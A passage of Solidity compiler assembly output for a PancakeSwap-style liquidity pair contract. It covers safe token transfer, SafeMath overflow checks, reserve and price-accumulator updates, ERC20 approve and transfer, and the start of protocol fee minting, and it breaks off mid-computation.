0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"Pair.sol\":1995:2007  bool success */\n      0x00\n      swap5\n        /* \"Pair.sol\":2009:2026  bytes memory data */\n      0x60\n      swap5\n        /* \"Pair.sol\":2030:2040  token.call */\n      dup10\n      and\n      swap4\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      swap3\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_326:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_328\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_326)\n    tag_328:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":2030:2107  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_330\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_329)\n        /* \"--CODEGEN--\":16:47   */\n    tag_330:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_329:\n      pop\n        /* \"Pair.sol\":1994:2107  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"Pair.sol\":2138:2145  success */\n      dup2\n        /* \"Pair.sol\":2138:2195  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_332\n      jumpi\n      pop\n        /* \"Pair.sol\":2150:2161  data.length */\n      dup1\n      mload\n        /* \"Pair.sol\":2150:2166  data.length == 0 */\n      iszero\n      dup1\n        /* \"Pair.sol\":2150:2194  data.length == 0 || abi.decode(data, (bool)) */\n      tag_332\n      jumpi\n      pop\n        /* \"Pair.sol\":2181:2185  data */\n      dup1\n        /* \"Pair.sol\":2170:2194  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_333\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_333:\n      pop\n        /* \"Pair.sol\":2170:2194  abi.decode(data, (bool)) */\n      mload\n        /* \"Pair.sol\":2150:2194  data.length == 0 || abi.decode(data, (bool)) */\n    tag_332:\n        /* \"Pair.sol\":2117:2245  require(... */\n      tag_334\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_334:\n        /* \"Pair.sol\":1914:2252  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_175:\n        /* \"SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_336\n      jumpi\n      pop\n      pop\n        /* \"SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"SafeMath.sol\":597:598  x */\n      dup3\n        /* \"SafeMath.sol\":592:593  y */\n      dup3\n        /* \"SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"SafeMath.sol\":592:593  y */\n      dup2\n        /* \"SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_337\n      jumpi\n      invalid\n    tag_337:\n      div\n        /* \"SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_336:\n        /* \"SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_177:\n        /* \"SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"Pair.sol\":3190:4173  function _update(... */\n    tag_186:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3352:3375  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":3352:3402  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_342\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3379:3402  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"Pair.sol\":3352:3402  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_342:\n        /* \"Pair.sol\":3331:3445  require(... */\n      tag_343\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_343:\n        /* \"Pair.sol\":3560:3578  blockTimestampLast */\n      sload(0x0b)\n        /* \"Pair.sol\":3486:3511  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"Pair.sol\":3486:3501  block.timestamp */\n      timestamp\n        /* \"Pair.sol\":3486:3511  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"Pair.sol\":3560:3578  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"Pair.sol\":3543:3578  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"Pair.sol\":3615:3630  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":3615:3648  timeElapsed > 0 && _reserve0 != 0 */\n      tag_345\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3634:3648  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"Pair.sol\":3615:3648  timeElapsed > 0 && _reserve0 != 0 */\n    tag_345:\n        /* \"Pair.sol\":3615:3666  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_346\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":3652:3666  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"Pair.sol\":3615:3666  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_346:\n        /* \"Pair.sol\":3611:4007  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_347\n      jumpi\n        /* \"Pair.sol\":3851:3862  timeElapsed */\n      dup1\n        /* \"Pair.sol\":3782:3862  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_348\n        /* \"Pair.sol\":3821:3830  _reserve0 */\n      dup6\n        /* \"Pair.sol\":3787:3814  UQ112x112.encode(_reserve1) */\n      tag_349\n        /* \"Pair.sol\":3804:3813  _reserve1 */\n      dup7\n        /* \"Pair.sol\":3787:3803  UQ112x112.encode */\n      tag_350\n        /* \"Pair.sol\":3787:3814  UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_349:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3787:3820  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"Pair.sol\":3787:3820  UQ112x112.encode(_reserve1).uqdiv */\n      tag_351\n        /* \"Pair.sol\":3787:3831  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_348:\n        /* \"Pair.sol\":3742:3762  price0CumulativeLast */\n      0x0c\n        /* \"Pair.sol\":3742:3862  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3782:3832  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"Pair.sol\":3782:3862  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"Pair.sol\":3742:3862  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"Pair.sol\":3916:3996  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"Pair.sol\":3921:3965  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_352\n        /* \"Pair.sol\":3955:3964  _reserve1 */\n      dup5\n        /* \"Pair.sol\":3921:3948  UQ112x112.encode(_reserve0) */\n      tag_349\n        /* \"Pair.sol\":3938:3947  _reserve0 */\n      dup8\n        /* \"Pair.sol\":3921:3937  UQ112x112.encode */\n      tag_350\n        /* \"Pair.sol\":3921:3948  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"Pair.sol\":3921:3965  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_352:\n        /* \"Pair.sol\":3876:3896  price1CumulativeLast */\n      0x0d\n        /* \"Pair.sol\":3876:3996  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":3916:3966  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"Pair.sol\":3916:3996  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"Pair.sol\":3876:3996  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"Pair.sol\":3611:4007  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_347:\n        /* \"Pair.sol\":4016:4024  reserve0 */\n      0x0b\n        /* \"Pair.sol\":4016:4044  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"Pair.sol\":4054:4082  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"Pair.sol\":4092:4127  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"Pair.sol\":4147:4155  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"Pair.sol\":4157:4165  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"Pair.sol\":4142:4166  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"Pair.sol\":3190:4173  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_197:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_356\n      swap1\n        /* \"ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_177\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_356:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_357\n      swap1\n        /* \"ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_358\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_357:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":4259:5152  function _mintFee(... */\n    tag_214:\n        /* \"Pair.sol\":4354:4364  bool feeOn */\n      0x00\n        /* \"Pair.sol\":4376:4389  address feeTo */\n      dup1\n        /* \"Pair.sol\":4401:4408  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":4392:4415  IFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_360\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_360:\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_361\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_361:\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_362\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_362:\n      pop\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      mload\n        /* \"Pair.sol\":4478:4483  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":4435:4454  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"Pair.sol\":4392:4417  IFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"Pair.sol\":4478:4483  kLast */\n      swap1\n        /* \"Pair.sol\":4508:5146  if (feeOn) {... */\n      tag_363\n      jumpi\n        /* \"Pair.sol\":4537:4548  _kLast != 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":4533:5079  if (_kLast != 0) {... */\n      tag_364\n      jumpi\n        /* \"Pair.sol\":4568:4578  uint rootK */\n      0x00\n        /* \"Pair.sol\":4581:4622  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_365\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      tag_218\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":4591:4606  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"Pair.sol\":4591:4610  uint(_reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":4591:4621  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":4581:4622  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_365:\n        /* \"Pair.sol\":4568:4622  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"Pair.sol\":4640:4654  uint rootKLast */\n      0x00\n        /* \"Pair.sol\":4657:4674  Math.sqrt(_kLast) */\n      tag_367\n        /* \"Pair.sol\":4667:4673  _kLast */\n      dup4\n        /* \"Pair.sol\":4657:4666  Math.sqrt */\n      tag_219\n        /* \"Pair.sol\":4657:4674  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_367:\n        /* \"Pair.sol\":4640:4674  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"Pair.sol\":4704:4713  rootKLast */\n      dup1\n        /* \"Pair.sol\":4696:4701  rootK */\n      dup3\n        /* \"Pair.sol\":4696:4713  rootK > rootKLast */\n      gt\n        /* \"Pair.sol\":4692:5065  if (rootK > rootKLast) {... */\n      iszero\n      tag_368\n      jumpi\n        /* \"Pair.sol\":4737:4751  uint numerator */\n      0x00\n        /* \"Pair.sol\":4754:4844  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_369\n        /* \"Pair.sol\":4821:4822  8 */\n      0x08\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_182\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      tag_371\n        /* \"Pair.sol\":4770:4775  rootK */\n      dup7\n        /* \"Pair.sol\":4780:4789  rootKLast */\n      dup7\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"Pair.sol\":4770:4779  rootK.sub */\n      tag_177\n        /* \"Pair.sol\":4770:4790  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_371:\n        /* \"Pair.sol\":4754:4765  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"Pair.sol\":4754:4769  totalSupply.mul */\n      tag_175\n        /* \"Pair.sol\":4754:4791  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":4754:4844  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_369:\n        /* \"Pair.sol\":4737:4844  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"Pair.sol\":4866:4882  uint denominator */\n      0x00\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_372\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      tag_373\n        /* \"Pair.sol\":4903:4912  rootKLast */\n      dup5\n        /* \"Pair.sol\":4917:4918  8 */\n      0x08\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      0xffffffff\n        /* \"Pair.sol\":4903:4916  rootKLast.mul */\n      tag_175\n        /* \"Pair.sol\":4903:4919  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_373:\n        /* \"Pair.sol\":4885:4898  